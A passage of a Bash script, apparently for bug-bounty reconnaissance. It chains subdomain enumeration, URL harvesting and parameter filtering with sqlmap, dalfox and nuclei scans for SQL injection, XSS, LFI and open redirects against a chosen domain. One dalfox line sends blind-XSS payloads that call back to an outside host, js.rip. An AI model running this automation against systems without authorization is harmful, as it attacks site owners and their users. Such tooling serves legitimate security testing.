ed:-nuclei,subfinder,httpx,gf,Haylxon,puredns,waybackurls or gau,(sqlmap,dalfox,corsy.py(optional))
#this tool takes a domain looks for subdomains, takes screenshot of them and uses httpx then looks for specials 
#parameters and test for sqli,xss,lfi
#it also runs nuclei templates on the found subdomains


# Define ANSI color codes
YELLOW='\033[1;33m'
NC='\033[0m' # No Color
RED='\033[0;31m'
GREEN='\033[0;32m'

# Print top line
printf "${YELLOW}"
printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' -
echo -e "${NC}"

# Print header with ASCII art (sun)
echo -e "${YELLOW}           \\      /"
echo -e "${YELLOW}            \\    /"
echo -e "${YELLOW}     ________\\  /________"
echo -e "${YELLOW}    /                   \\"
echo -e "${YELLOW}   /_____________________\\"
echo -e "${YELLOW}   \\  _________________  /"
echo -e "${YELLOW}     |                 |"
echo -e "${YELLOW}     |                 |"
echo -e "${YELLOW}     |    AUTOMATIC    |"
echo -e "${YELLOW}     |_________________|"                                              v1.0.0
echo -e "${NC}"

# Print bottom line
printf "${YELLOW}"
printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' -
echo -e "${NC}"

# URL of the file containing the latest version number on GitHub
VERSION_URL="https://raw.githubusercontent.com/i-forgo-it/Automatic/main/version.txt"

# Function to check for updates
check_for_updates() {
    latest_version=$(curl -s "$VERSION_URL")
    current_version="1.0.0"  # Set your current version here

    if [[ "$latest_version" != "$current_version" ]]; then
        echo "\e[31m[WARNING!!]\e[0m""A newer version ($latest_version) is available. Please update your script."
    else
        echo "You are running the latest version of the script."
    fi
}

# Run the function to check for updates
check_for_updates

#downloads a list or resolvers
curl --silent -o resolvers.txt https://raw.githubusercontent.com/proabiral/Fresh-Resolvers/master/resolvers.txt 
echo "updated the list of resolvers"

#warning
echo -e "\e[31m[WARNING!!]\e[0m""Change the path for httpx in the script and the path for hxn "

#define the rate limit for this program 
read -p "What is the rate limit (used for nuclei): " ratelimit

#used to add custom Hackerone header
read -p "Enter hackerOne custom header ex: User-Agent:Hackerone-username " header 

#read the domain given by the user 
read -p "Enter domain: " domain

##wayack or gau
#asks for waybackurls
read -p "Do you want to run waybackurls (way faster)? (y/n): " run_wayback

#asks for gau
read -p "Do you want to run gau (you can run both)? (y/n): " run_gau

#which one to use 
read -p "Which one do you want to use for gf ? (waybackurls/gau)": run_choosed

#asks for sqlmap
read -p "Do you want to run sqlmap? (y/n): " run_sqlmap

#asks for gau
read -p "Do you want to run corsy.py ? (y/n): " run_corsy

#asks for  dalfox
read -p "Do you want to run dalfox? (y/n): " run_dalfox
if [ "$run_lfi" == "y" ]; then
    echo "do not forget to change the payload for xss :)"
fi

if [ "$run_lfi" == "y" ]; then
    echo -e "\e[31m[WARNING!!]\e[0m" "do not forget to change the LFImap path in the script :)"
fi

#asks for exceded time 
read -p "do you want to stop the nuclei scans for lfi,sql,xss,redirects after a certain amout of time so it is shorter? (y/n):" run_time

#asks for exceded time 

if [ "$run_time" == "y" ]; then
    read -p "how much time do you want nuclei to stop after ? (in seconds) 600s=10m: " TIMEOUT_SECONDS
fi

#creates a folder for the given target 
mkdir "$domain"
echo "folder '$domain' was created" 
sleep 1

#adds nuclei templates 
cd "$domain"
echo "Press CTRL+D when done and enter custom nuclei templates" 
echo -e "\e[32m(format=http/misconfiguration/)\e[0m"
content=""
while IFS= read -r line; do
    content+="$line\n"  
done
echo -e "http/misconfiguration/\nhttp/exposed-panels/\ntree/main/code/cves/\ntree/main/http/cves/2024/\ntree/main/http/exposures/ " > nucleitemplates.txt
echo -e "$content" >> nucleitemplates.txt

#runs subfinder on the given target 
subfinder -d "$domain" > subfindersubdomain.txt
echo -e "subfinder is finished" "\e[36m[1/12]\e[0m"

# Add https:// to each line in domain.txt
sed 's/^/https:\/\//' subfindersubdomain.txt > httpssubfinder.txt 
echo -e "httpssubfinder file created" "\e[36m[2/12]\e[0m"

#uses puredns to resolve domains
puredns resolve subfindersubdomain.txt -r /home/kali/resolvers.txt | tee purednsresult.txt 
echo -e "domains are resolved" "\e[36m[3/12]\e[0m"

# goes through httpx and creates different ones
~/go/bin/httpx -list  purednsresult.txt  -sc -title -fr -o httpx.txt 
awk -F'\\[' '{print $1}' httpx.txt | tee filtered.txt 
echo -e "httpx was ran" "\e[36m[4/12]\e[0m"

# Extract URLs from subfindersubdomain.txt using gau
if [ "$run_gau" == "y" ]; then
  cat subfindersubdomain.txt | gau --blacklist png,jpg,gif > gau.txt
echo -e "extracting urls with gau..." "\e[36m[4,5/12]\e[0m"
fi

# Extract URLs from subfindersubdomain.txt using waybackurls
if [ "$run_wayback" == "y" ]; then
  waybackurls "$domain" | tee waybackurls.txt
  echo -e "subfinder was ran" "\e[36m[4,5/12]\e[0m"
fi

# Use gf to find XSS parameters from URLs and uses fuzzing with nuclei to find others param
#uses waybackurls
if [ "$run_choosed" == "waybackurls" ]; then
    cat waybackurls.txt | gf xss > Xssparams.txt 

    cat waybackurls.txt | gf redirect > redirectparams.txt

    cat waybackurls.txt | gf sqli > sqliparams.txt

    cat waybackurls.txt | gf lfi > lFIparams.txt

    echo -e "dir params was created and gf was ran \e[36m[6/12]\e[0m"
fi

#uses gau
if [ "$run_choosed" == "gau" ]; then
    cat gau.txt | gf xss > Xssparams.txt 

    cat gau.txt | gf redirect > redirectparams.txt

    cat gau.txt | gf sqli > sqliparams.txt

    cat gau.txt| gf lfi > lFIparams.txt

    echo -e "dir params was created and gf was ran \e[36m[6/12]\e[0m"
fi


#runs corsy
if [ "$run_corsy" == "yes" ]; then
  python3 /home/kali/Corsy/corsy.py -i filtered.txt -d 1 | tee CORSmissconfig.txt 
    echo -e "corsy is ran and CORSmissconfig.txt is created \e[36m[7/12]\e[0m"
fi

#runs sqlmap
if [ "$run_sqlmap" == "y" ]; then
    sqlmap -m sqliparams.txt --random-agent --level=2 --risk=2 --technique=T 
    echo -e "sqlmap is finished \e[36m[8/12]\e[0m"
fi

#runs dalfox
if [ "$run_dalfox" == "y" ]; then
    cat Xssparams.txt | sed 's/=.*/=/' | sed 's/URL: //' |  tee testxss.txt
    dalfox file testxss.txt -b https://js.rip/kc pipe -H "$header" -o dalfox.txt
    echo -e "dalfox is finished \e[36m[9/12]\e[0m"
fi

#runs if said yes to run time 
if [ "$run_time" == "y" ]; then #runs nuclei for lfi
  timeout "$TIMEOUT_SECONDS" bash -c ' 
nuclei -l  lFIparams.txt -rl "$ratelimit"  -H "$header"  -t dast/vulnerabilities/lfi/  -stats -dast -o resultnucleiLFI.txt 
echo -e "lfi nuclei scan is finished \e[36m[10/12]\e[0m"
'

#runs nuclei for xss
      timeout "$TIMEOUT_SECONDS" bash -c '
nuclei -l  Xssparams.txt -rl "$ratelimit"  -H "$header"  -t dast/vulnerabilities/xss/  -stats -dast -o resultnucleixss.txt 
echo -e "xss nuclei scan is finished \e[36m[10/12]\e[0m"
'

#runs nuclei for sqli,
        timeout "$TIMEOUT_SECONDS" bash -c '
nuclei -l sqliparams.txt -rl "$ratelimit"  -H "$header"  -t dast/vulnerabilities/sqli/ -stats -dast -o resultnucleisqli.txt 
echo -e "sqli nuclei scan is finished \e[36m[10/12]\e[0m"
'

#runs nuclei for redirect
    timeout "$TIMEOUT_SECONDS" bash -c '
nuclei -l redirectparams.txt -rl "$ratelimit"  -H "$header"  -t /home/kali/openredirect.yaml -stats -o resultnucleiredirect.txt 
echo -e "sqli nuclei scan is finished \e[36m[10/12]\e[0m"
'
fi

#runs if said no to run time 
if [ "$run_time" == "n" ]; then
   #runs nuclei for lfi
nuclei -l  lFIparams.txt -rl "$ratelimit"  -H "$header"  -t dast/vulnerabilities/lfi/  -stats -dast -o resultnucleiLFI.txt 
echo -e "lfi nuclei scan is finished \e[36m[10/12]\e[0m"

#runs nuclei for xss
nuclei -l  Xssparams.txt -rl "$ratelimit"  -H "$header"  -t dast/vulnerabilities/xss/  -stats -dast -o resultnucleixss.txt 
echo -e "xss nuclei scan is finished \e[36m[10/12]\e[0m"

#runs nuclei for sqli,
nuclei -l sqliparams.txt -rl "$ratelimit"  -H "$header"  -t dast/vulnerabilities/sqli/ -stats -dast -o resultnucleisqli.txt 
echo -e "sqli nuclei scan is finished \e[36m[10/12]\e[0m"

#runs nuclei for redirect
nuclei -l redirectparams.txt -rl "$ratelimit"  -H "$header"  -t /home/kali/openredirect.yaml -stats -o resultnucleiredirect.txt 
echo -e "sqli nuclei scan is finished \e[36m[10/12]\e[0m"
fi

#runs specific nuclei templates for every sub more oriented content discovery 
read "updating nuclei templates"
nuclei -ut
read "nuclei templates are updated now running the scan"
nuclei -l filtered.txt -rl "$ratelimit"  -H "$header"  -stats -t nucleitemplates.txt -o nuclei.txt 
echo -e "nuclei templates are finsihed \e[36m[11/12]\e[0m"

#takes screenshot of every working url 
hxn --binary-path /usr/bin/google-chrome -f filtered.txt 
echo -e "hxn is finished  \e[36m[12/12]\e[0m"
